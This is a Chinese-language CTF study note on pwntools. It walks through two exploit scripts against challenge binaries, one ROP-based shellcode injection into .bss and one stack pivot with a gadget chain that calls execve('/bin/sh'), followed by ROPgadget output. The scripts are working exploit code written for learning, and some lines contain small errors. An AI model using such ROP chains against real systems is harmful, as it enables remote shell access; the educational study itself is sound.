# pwntools模块

之前做了一些`pwn`题目，但是感觉自己对于pwntools的使用不算很清晰，有一些模块也没有理清楚

先看这个君莫笑师傅的exp

```python
# 这个例子是ret2libc的，生成一段shellcode注入到bss段中之后进行调用？
from pwn import *
import time

proc = './static'
bss_addr = 0x0804A024

context.binary = proc
shellcode = asm(shellcraft.sh())
p = process(proc)
rop = ROP(proc) #构造了一个rop

rop.read(0, bss_addr+100, len(shellcode)) #直接调用read函数
rop.call(bss_addr+100)
p.recvuntil("Welcome to zsctf!")
p.send('a'*20+str(rop))

time.sleep(1)
p.send(shellcode)
p.interactive()
```

这里吧`read`函数的文档找了一下：

```c
#include <unistd>
ssize_t read(int filedes, void *buf, size_t nbytes);
// 返回：若成功则返回读到的字节数，若已到文件末尾则返回0，若出错则返回-1
// filedes：文件描述符
// buf:读取数据缓存区
// nbytes:要读取的字节数
```

文件描述符是啥来着又忘了。。

| 文件描述符 | 缩写   | 描述         |
| ---------- | ------ | ------------ |
| 0          | STDIN  | 标准输入     |
| 1          | STDOUT | 标准输出     |
| 2          | STDERR | 标准错误输出 |

所以我们使用了 `rop.read(0, bss_addr+100, len(shellcode))`函数， 就相当于从标准输入读取文件， 缓冲区是`bss_addr+100`,要读取的字节数就是`len(shellcode)`这么大

所以借`read`函数完成了一次写缓冲区的操作？

善良的程序以为我们真的只是传递了数据进去，谁想到我们传进去的竟然是一段`shellcode`！！

所以之后调用`rop.call(bss_addr+100)`就完成了`shellcode`的执行了

同时我们再把`write`函数复习一下吧

```c
#include <unistd>
ssize_t write(int filedes, void *buf, size_t nbytes);
// 返回：若成功则返回写入的字节数，若出错则返回-1
// filedes：文件描述符
// buf:待写入数据缓存区
// nbytes:要写入的字节数
```

和`read`函数是类似的

看到了一篇[文章](<https://www.jianshu.com/p/0d45e2025d97>)

预览一下rop的所有属性和方法

```python
In [59]: rop.
rop.base                   rop.elfs                   rop.leave                  rop.resolve
rop.build                  rop.find_gadget            rop.migrate                rop.search
rop.call                   rop.find_stack_adjustment  rop.migrated               rop.search_iter
rop.chain                  rop.from_blob              rop.pivots                 rop.setRegisters
rop.describe               rop.gadgets                rop.raw                    rop.unresolve
rop.dump                   rop.generatePadding        rop.regs           
```

还挺多的



## gadget 的使用

来看校赛的题目吧

先来分析一下某位师傅的wp

![img](https://qqadapt.qpic.cn/txdocpic/0/ab0a7d9168dfb8f02ad3593279935c28/0)

利用了标黄色的几个`gadget`

先看一下：

```
0x080491e8 : pop eax; leave; ret
0x080491e4 : pop ecx; pop ebx; leave ret
0x080491e1 : pop edx; leave; ret

解释一下 leave :
mv esp, ebp   ;也就是相当于将当前栈的基地赋给 esp
pop ebp; 恢复ebp

还有 ret指令
pop eip   ;将当前栈顶的内容pop到eip中，然后跳转过去
```

执行一次系统调用

`execve("/bin/sh",NULL,NULL)`

需要做一下准备

- 系统调用号，即 eax 应该为 0xb
- 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。
- 第二个参数，即 ecx 应该为 0
- 第三个参数，即 edx 应该为 0

要想达到这个效果，我们需要精确的对栈进行布局

> **payload :** padding + address of gadget 1 + address of gadget 2 + ...... address of gadget n

![img](https://pic1.zhimg.com/80/v2-a4964a02ab5a974439a157cf9d5b017c_hd.png)



这真的是一个奇妙又精巧的构造，我们知道函数在退栈的时候会 `leave ret`， 也就是`pop eip`

如果返回地址被覆盖，跳转到了我们想要的`gadget`，就像多米诺骨牌一样，第一个触发了，后面的就会依次触发，最后就如同三级火箭终于依靠那多余的几级升上了天一样，我们的目标就此达成了

说归说，怎么做还是有很大的技术含量的

先把师傅的exp看一下

```python
from pwn import *
import time

context.log_level = 'debug'
proc = './Knock-Knock3'

p = process(proc)
elf = ELF(proc)
gdb.attach(p)
p.recv()
padding = 'a'*9 + '\x00' + 'a'*8
fakeebp = 0x804c038  #这个地址是bss段地址
payload1 = padding
payload1 += p32(fakeebp+0x100)
payload1 += p32(elf.plt['gets']+p32(0x080491EB)+p32(fakeebp))  #0x080491EB是who函数的地址
p.sendline(payload1)
time.sleep(1)
#gadgets
popebxret = p32(0x0804901e)   # pop ebx; ret
popeaxleaveret = p32(0x080491e8)  #pop eax; leave; ret
popecxebxleaveret = p32(0x080491e4) # pop ecx; pop ebx; leave; ret
popedxleaveret = p32(0x080491e1)  # pop edx; ret
# reg
eax = p32(0x0b)
ebx = p32(0x0804a063)
ecx = p32(0x00)
edx = p32(0x00)
int80 = p32(0x080491d5)

setstackonbss = p32(fakeebp + 0x4*4) + popecxebxleaveret + ecx + ebx + p32(fakeebp + 0x7*4) + popedxleaveret + edx +p32(fakeebp + 0x100) +int80

p.sendline(setstackonbss)
p.recv()
payload2 = padding + p32(fakeebp) + popeaxleaveret + eax
p.sendline(payload2)

p.interactive()
```

基本思路：覆盖到bss段，通过在bss段调用函数进行相关的内存布局，之后回到栈继续内存布局，最后成功地进行一次系统调用





还是复现一遍

```c
root@kali:~/pwn# ROPgadget --binary ./Knock-Knock3 | grep "pop eax"
0x080491e8 : pop eax ; leave ; ret
root@kali:~/pwn# ROPgadget --binary ./Knock-Knock3 | grep "pop ebx"
0x080493a1 : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x0804937d : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804901b : add esp, 8 ; pop ebx ; ret
0x08049317 : clc ; pop ecx ; pop ebx ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret
0x0804937b : jne 0x8049369 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08049315 : lea esp, dword ptr [ebp - 8] ; pop ecx ; pop ebx ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret
0x0804901c : les ecx, ptr [eax] ; pop ebx ; ret
0x080491e5 : pop ebx ; leave ; ret
0x08049319 : pop ebx ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret
0x08049380 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804901e : pop ebx ; ret
0x080491e4 : pop ecx ; pop ebx ; leave ; ret
0x08049318 : pop ecx ; pop ebx ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret
0x08049016 : sal byte ptr [edx + eax - 1], 0xd0 ; add esp, 8 ; pop ebx ; ret
root@kali:~/pwn# ROPgadget --binary ./Knock-Knock3 | grep "pop ecx"
0x08049317 : clc ; pop ecx ; pop ebx ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret
0x08049315 : lea esp, dword ptr [ebp - 8] ; pop ecx ; pop ebx ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret
0x080491e4 : pop ecx ; pop ebx ; leave ; ret
0x08049318 : pop ecx ; pop ebx ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret
root@kali:~/pwn# ROPgadget --binary ./Knock-Knock3 | grep "pop edx"
0x080491db : add byte ptr [0x2e24], al ; pop edx ; leave ; ret
0x080491da : add byte ptr [eax], al ; add eax, 0x2e24 ; pop edx ; leave ; ret
0x080491df : add byte ptr [eax], al ; pop edx ; leave ; ret
0x080491de : add byte ptr cs:[eax], al ; pop edx ; leave ; ret
0x080491dc : add eax, 0x2e24 ; pop edx ; leave ; ret
0x080491dd : and al, 0x2e ; add byte ptr [eax], al ; pop edx ; leave ; ret
0x080491e1 : pop edx ; leave ; ret
```

突然发现地址什么的都没有变化



